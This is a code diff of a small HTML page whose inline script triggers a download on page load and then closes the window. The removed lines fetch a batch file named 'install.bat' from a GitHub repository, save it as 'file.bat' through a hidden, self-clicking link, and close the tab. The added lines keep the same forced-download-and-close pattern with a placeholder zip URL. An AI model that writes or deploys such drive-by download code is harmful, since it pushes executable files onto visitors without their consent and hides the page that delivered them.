@@ -2,23 +2,16 @@
 <html>
 <body>
 <script>
-(async () => {
-  const url = "https://raw.githubusercontent.com/Proutman67/educational/refs/heads/main/install.bat";
-
-  const res = await fetch(url, { credentials: "include" });
-  const blob = await res.blob();
+  const url = "https://example.com/file.zip";
 
   const a = document.createElement("a");
-  a.href = URL.createObjectURL(blob);
-  a.download = "file.bat";
+  a.href = url;
+  a.download = "";
   document.body.appendChild(a);
   a.click();
-
-  URL.revokeObjectURL(a.href);
-  a.remove();
+  document.body.removeChild(a);
 
   setTimeout(() => window.close(), 500);
-})();
 </script>
 </body>
 </html>
